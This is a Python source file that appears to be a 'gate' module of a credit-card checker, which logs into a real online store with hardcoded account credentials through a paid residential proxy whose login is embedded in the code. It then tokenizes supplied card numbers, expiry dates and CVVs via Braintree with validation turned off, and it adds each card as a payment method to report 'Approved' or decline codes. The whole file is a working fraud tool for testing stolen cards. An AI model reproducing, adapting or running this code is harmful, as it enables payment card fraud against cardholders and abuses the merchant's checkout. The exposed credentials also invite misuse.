import urllib3
from requests import Session
from retry_requests import retry
from configbraintreee.ConfigsBraintree import BehaviorsBraintree
import requests
import time

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class BraintreeAuthWoo:
    'Clase de la pagina que quedara como gate'
    def main(self,card):
        try: 
            self.session = requests.Session()
            self.session.proxies.update({'http://': 'http://17f478d14ce695e5:RNW78Fm5@res.proxy-seller.com:10000', 'https://': 'http://17f478d14ce695e5:RNW78Fm5@res.proxy-seller.com:10000'})

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','if-modified-since': 'Wed, 14 Aug 2024 16:45:49 GMT','priority': 'u=0, i','referer': 'https://store.ie.edu/my-account/add-payment-method/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.session.get('https://store.ie.edu/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://store.ie.edu/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.req_1 = self.session.get('https://store.ie.edu/my-account/', headers=headers)
            self.nonce_login = BehaviorsBraintree().QueryText(self.req_1.text, 'name="woocommerce-login-nonce" value="','"')
            print(self.nonce_login)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://store.ie.edu','priority': 'u=0, i','referer': 'https://store.ie.edu/my-account/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            data = {
                'username': 'yuhiro897@gmail.com',
                'password': 'Cuenta1234',
                'woocommerce-login-nonce': self.nonce_login,
                '_wp_http_referer': '/my-account/',
                'login': 'Log in',
                'redirect': 'https://store.ie.edu/my-account/',
                'user_msg': '',
            }
            self.session.post('https://store.ie.edu/my-account/', headers=headers, data=data)
            time.sleep(5)
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://store.ie.edu/my-account/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.session.get('https://store.ie.edu/my-account/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://store.ie.edu/my-account/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.session.get('https://store.ie.edu/my-account/payment-methods/', headers=headers)
            time.sleep(5)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','priority': 'u=0, i','referer': 'https://store.ie.edu/my-account/payment-methods/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.req_2 = self.session.get('https://store.ie.edu/my-account/add-payment-method/', headers=headers)
            wc_braintree_client_token = BehaviorsBraintree().QueryText(self.req_2.text,'var wc_braintree_client_token = ["','"')
            payment_nonce = BehaviorsBraintree().QueryText(self.req_2.text, 'name="woocommerce-add-payment-method-nonce" value="', '"')
            self.token_bear = BehaviorsBraintree().DecodeBear(wc_braintree_client_token)
            
            self.client_id = BehaviorsBraintree().SessionId()
            self.ccs = BehaviorsBraintree().Ccs(card)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9','authorization': f'Bearer {self.token_bear}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            json_data = {
                'clientSdkMetadata': {
                    'source': 'client',
                    'integration': 'custom',
                    'sessionId': self.client_id,
                },
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
                'variables': {
                    'input': {
                        'creditCard': {
                            'number': self.ccs[0],
                            'expirationMonth': self.ccs[1],
                            'expirationYear': self.ccs[2],
                            'cvv': self.ccs[3],
                            'billingAddress': {
                                'postalCode': '10080',
                                'streetAddress': 'Times square 20',
                            },
                        },
                        'options': {
                            'validate': False,
                        },
                    },
                },
                'operationName': 'TokenizeCreditCard',
            }

            self.req_3 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.nonce_card = BehaviorsBraintree().QueryText(self.req_3.text,'{"token":"','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://store.ie.edu','priority': 'u=0, i','referer': 'https://store.ie.edu/my-account/add-payment-method/','sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',}
            self.braintree_cc_config_data = {"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/jq8x8vgv6wc36qph/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/jq8x8vgv6wc36qph"},"merchantId":"jq8x8vgv6wc36qph","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"IE","currencyCode":"EUR","merchantIdentifier":"jq8x8vgv6wc36qph","supportedNetworks":["visa","mastercard","amex"]},"kount":{"kountMerchantId":None},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["American Express","Discover","Maestro","UK Maestro","MasterCard","Visa"]},"threeDSecureEnabled":True,"threeDSecure":{"cardinalAuthenticationJWT":"eyJhbGciOiJIUzI1NiJ9.eyJqdGkiOiI4MmUxY2UxYS1mZmYwLTRlNDAtYTk0Mi02YjExYWJiMDUyZjAiLCJpYXQiOjE3MjM3NjQ1NjQsImV4cCI6MTcyMzc3MTc2NCwiaXNzIjoiNWM2Yzg1OTc4MjNjMTYyMWJjZGViYzMxIiwiT3JnVW5pdElkIjoiNWEzN2Y0M2M1MTJjZmIyMzg0OWI0OWRjIn0.gBt79gyBa-APYYPIhzGzXguIQWH7_exQUZVfgIockLo"},"androidPay":{"displayName":"IE Publishing","enabled":True,"environment":"production","googleAuthorizationFingerprint":self.token_bear,"paypalClientId":None,"supportedNetworks":["visa","mastercard","amex"]},"paypalEnabled":True,"paypal":{"displayName":"IE Publishing","clientId":"ASZ18y9YRjCdL0khds4Uaux1VVcbDMw4avyOcT9YoxUPOsHm2uQDwEXB68tdXvZr-fxMcIcPXdEDf4ub","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":False,"unvettedMerchant":False,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":True,"merchantAccountId":"tiendaonlineEUR","payeeEmail":None,"currencyIsoCode":"EUR"}}
            data = {
                'payment_method': 'braintree_cc',
                'braintree_cc_nonce_key': self.nonce_card,
                'braintree_cc_device_data': '',
                'braintree_cc_3ds_nonce_key': '',
                'braintree_cc_config_data': f'{self.braintree_cc_config_data}',
                'woocommerce-add-payment-method-nonce': payment_nonce,
                '_wp_http_referer': '/my-account/add-payment-method/',
                'woocommerce_add_payment_method': '1',
                'user_msg': '',
            }
            sexo = self.session.post('https://store.ie.edu/my-account/add-payment-method/', headers=headers, data=data)

            self.session.close()
            if 'Payment method successfully added.' in sexo.text:  return 'Approved! ✅', 'Nice! New payment method added'
            error = BehaviorsBraintree().QueryText(sexo.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
            
            if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', '1000: Approved'
            else: 
                code = BehaviorsBraintree().Response(error[1].split('t method. Reason: ')[1].strip())
                return code
        except: 
            return 'Payment error: Gateway Rejected: risk_threshold'


